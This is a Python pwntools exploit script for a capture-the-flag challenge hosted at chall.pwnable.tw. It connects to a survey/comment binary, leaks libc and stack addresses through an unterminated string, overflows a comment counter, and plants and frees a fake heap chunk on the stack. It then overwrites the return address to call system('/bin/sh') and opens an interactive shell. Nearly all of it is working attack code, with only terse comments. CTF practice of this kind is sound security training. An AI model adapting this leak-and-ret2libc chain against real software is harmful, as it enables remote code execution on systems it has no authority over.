#!/usr/bin/env python3
from pwn import *

p = remote("chall.pwnable.tw", "10204")

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# context.update(binary=elf, log_level="DEBUG")
# p = elf.process()
# gdb.attach(
#     p,
#     """
#     b *main+46
#     b *survey+447
# """,
# )


def comment(name, age, movie_reason, cmt):
    print(p.recvuntil(b"name: "))
    p.sendline(name)
    print(p.recvuntil(b"age: "))
    p.sendline(str(age).encode())
    print(p.recvuntil(b"movie? "))
    p.sendline(movie_reason)
    print(p.recvuntil(b"comment: "))
    p.sendline(cmt)
    return


# leak - use movie_reason | read not insert NULL into last string and printf => leak libc
name = b"A" * 16
age = 23
movie_reason = b"B" * 79
cmt = b"C" * 59
comment(name, age, movie_reason, cmt)

p.recvuntil(b"BBB\n")
leak = p.recv(12)
rsp = u32(leak[0:4]) - 0x118
libc.address = u32(leak[8:12]) - 0x1B0D60
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))

log.info("rsp:               " + hex(rsp))
log.info("ELF base address:  " + hex(elf.address))
log.info("LIBC base address: " + hex(libc.address))
log.info("system address:    " + hex(system))
log.info("`/bin/sh` address: " + hex(binsh))

print(p.recvuntil(b"<y/n>: "))
p.sendline(b"y")

# get cnt -> three digits
name = b"D" * 16
age = 23
movie_reason = b"E" * 16
cmt = b"F" * 16
for i in range(9):
    comment(name, age, movie_reason, cmt)
    print(p.recvuntil(b"<y/n>: "))
    p.sendline(b"y")

for i in range(90):
    print(p.recvuntil(b"age: "))
    p.sendline(str(age).encode())
    print(p.recvuntil(b"movie? "))
    p.sendline(movie_reason)
    print(p.recvuntil(b"<y/n>: "))
    p.sendline(b"y")

############# get shell ###########
name = b"G" * 16
age = 23
print(p.recvuntil(b"name: "))
p.sendline(name)
print(p.recvuntil(b"age: "))
p.sendline(str(age).encode())

# fake chunk in movie_reason address
rbp = rsp + 0x118 - 0x20
movie_reason_addr = rbp - 0x50
log.info("rbp:                                  " + hex(rbp))
log.info("movie_reason address in stack:        " + hex(movie_reason_addr))
movie_reason = p32(0) + p32(0x41)
movie_reason += b"A" * 0x38
movie_reason += p32(0) + p32(0x11)
print(p.recvuntil(b"movie? "))
p.sendline(movie_reason)

# fake pointer *name => movie_reason address
cmt = b"I" * 80
cmt += p32(1) + p32(movie_reason_addr + 8)
print(p.recvuntil(b"comment: "))
p.send(cmt)
print(p.recvuntil(b"<y/n>: "))
p.sendline(b"y")  # free fake chunk in movie_reason

# malloc name return pointer in movie_reason stack addr [rbp - 0x50] and read 0x6e => RIP control
name = b"A" * 0x48 + b"BBBB"
name += p32(system)
name += p32(0)
name += p32(binsh)
age = 23
movie_reason = b"E" * 16
cmt = b"F" * 16

comment(name, age, movie_reason, cmt)
print(p.recvuntil(b"<y/n>: "))
p.sendline(b"n")

p.interactive()
